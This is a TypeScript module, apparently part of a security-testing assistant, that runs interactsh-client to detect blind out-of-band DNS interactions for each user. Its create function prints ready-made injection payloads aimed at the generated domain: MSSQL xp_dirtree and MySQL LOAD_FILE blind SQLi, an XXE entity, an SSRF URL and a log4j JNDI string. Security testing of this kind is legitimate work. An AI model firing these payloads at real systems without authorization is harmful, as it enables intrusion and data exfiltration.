// DNS out-of-band testing (OAST via interactsh-client). Complements the HTTP
// OAST (webhook.site) by proving BLIND bugs that only emit DNS — blind SQLi,
// XXE OOB, SSRF via DNS, log4shell-style. Manages one interactsh-client process
// per user; per-user state at .data/users/<user>/oast-dns.json.
import { spawn } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, openSync, readFileSync, renameSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { sanitizeUser, userDataRoot } from "./users";

type OastDns = { pid: number; domain: string; logFile: string; createdAt: string };

function installHint(): string {
  return "interactsh-client belum terpasang. Install (keyless):\n  go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\nthen symlink: ln -sf $HOME/go/bin/interactsh-client /opt/homebrew/bin/";
}
function binPath(): string {
  const local = join(homedir(), "go", "bin", "interactsh-client");
  return existsSync(local) ? local : "interactsh-client";
}
function statePath(userKey: string): string {
  return join(userDataRoot(), userKey, "oast-dns.json");
}
function readState(rawUser: unknown): { userKey: string; state: OastDns | null } | null {
  const userKey = sanitizeUser(rawUser);
  if (!userKey) return null;
  try {
    return { userKey, state: JSON.parse(readFileSync(statePath(userKey), "utf8")) as OastDns };
  } catch {
    return { userKey, state: null };
  }
}
function writeState(userKey: string, state: OastDns | null): void {
  const f = statePath(userKey);
  mkdirSync(dirname(f), { recursive: true });
  const tmp = `${f}.tmp`;
  writeFileSync(tmp, JSON.stringify(state, null, 2));
  renameSync(tmp, f);
}

export async function oastDnsCreate(rawUser: unknown): Promise<string> {
  const s = readState(rawUser);
  if (!s) return "Error: invalid user";
  if (s.state?.pid) {
    try {
      process.kill(s.state.pid, "SIGKILL");
    } catch { /* already gone */ }
  }
  if (!existsSync(binPath()) && binPath() === "interactsh-client") {
    // resolve via PATH best-effort
  }
  const dir = mkdtempSync(join(tmpdir(), "mia-oast-dns-"));
  const logFile = join(dir, "interactions.json");
  const errFile = join(dir, "stderr.log");
  let child;
  try {
    child = spawn(binPath(), ["-json", "-o", logFile], { detached: true, stdio: ["ignore", "ignore", openSync(errFile, "w")] });
  } catch (e) {
    return `Error: ${installHint()} (${e instanceof Error ? e.message : String(e)})`;
  }
  let domain = "";
  for (let i = 0; i < 30 && !domain; i++) {
    await new Promise((r) => setTimeout(r, 300));
    try {
      domain = (readFileSync(errFile, "utf8").match(/([a-z0-9]{20,}\.oast\.[a-z]+)/i) || [])[1] || "";
    } catch { /* not yet */ }
    if (child.exitCode !== null && !domain) break;
  }
  child.unref();
  if (!domain) {
    try {
      process.kill(child.pid as number, "SIGKILL");
    } catch { /* ignore */ }
    try {
      const err = readFileSync(errFile, "utf8").slice(-300);
      return `Error: interactsh-client tidak menghasilkan domain${err ? ` (${err.replace(/\s+/g, " ").trim()})` : ""}. ${installHint()}`;
    } catch {
      return `Error: interactsh-client gagal start. ${installHint()}`;
    }
  }
  writeState(s.userKey, { pid: child.pid as number, domain, logFile, createdAt: new Date().toISOString() });
  return [
    `🧬 DNS-OAST aktif — domain unik: ${domain}`,
    "",
    "Pakai di payload yang memicu resolusi DNS (blind):",
    `• Blind SQLi: '; EXEC master..xp_dirtree '//${domain}/x'--  (MSSQL) / LOAD_FILE(CONCAT('\\\\',(SELECT …),'.${domain}\\x')) (MySQL)`,
    `• XXE OOB: <!ENTITY x SYSTEM "http://${domain}/x">  atau SYSTEM "//${domain}/x"`,
    `• SSRF (DNS only): http://target/fetch?url=http://${domain}/`,
    `• RCE/log4j: \${jndi:ldap://${domain}/a}`,
    "",
    "Kirim via tool ber-scope, lalu cek `oast_dns_poll`. Hentikan dengan `oast_dns_stop`.",
  ].join("\n");
}

export async function oastDnsPoll(rawUser: unknown): Promise<string> {
  const s = readState(rawUser);
  if (!s || !s.state) return "Belum ada DNS-OAST aktif — jalankan `oast_dns_create` dulu.";
  let lines: string[] = [];
  try {
    lines = readFileSync(s.state.logFile, "utf8").split("\n").filter(Boolean);
  } catch {
    return `🧬 DNS-OAST ${s.state.domain} — belum ada interaksi.`;
  }
  if (!lines.length) return `🧬 DNS-OAST ${s.state.domain} — belum ada interaksi (0 hit).`;
  const fmt = lines.slice(-20).map((l) => {
    try {
      const j = JSON.parse(l) as { protocol?: string; "q-type"?: string; method?: string; url?: string; "remote-address"?: string; "raw-request"?: string };
      const what = j.url || (j["raw-request"] || "").split("\n").find((x) => /^\;?[a-z0-9-]+\./i.test(x.trim()))?.trim() || "";
      return `• [${j.protocol || "?"}${j["q-type"] ? "/" + j["q-type"] : ""}${j.method ? "/" + j.method : ""}] ${j["remote-address"] || ""} ${what.slice(0, 100)}`.trim();
    } catch {
      return `• ${l.slice(0, 100)}`;
    }
  });
  return `🧬 DNS-OAST ${s.state.domain} — ${lines.length} interaksi (${fmt.length} terbaru):\n${fmt.join("\n")}\n\n⚠️ Hit = bukti OOB. Catat sebagai finding (evidence) sebelum lapor.`;
}

export async function oastDnsStop(rawUser: unknown): Promise<string> {
  const s = readState(rawUser);
  if (!s || !s.state) return "Tidak ada DNS-OAST aktif.";
  try {
    process.kill(s.state.pid, "SIGKILL");
  } catch { /* ignore */ }
  writeState(s.userKey, null);
  return `🛑 DNS-OAST ${s.state.domain} dihentikan.`;
}
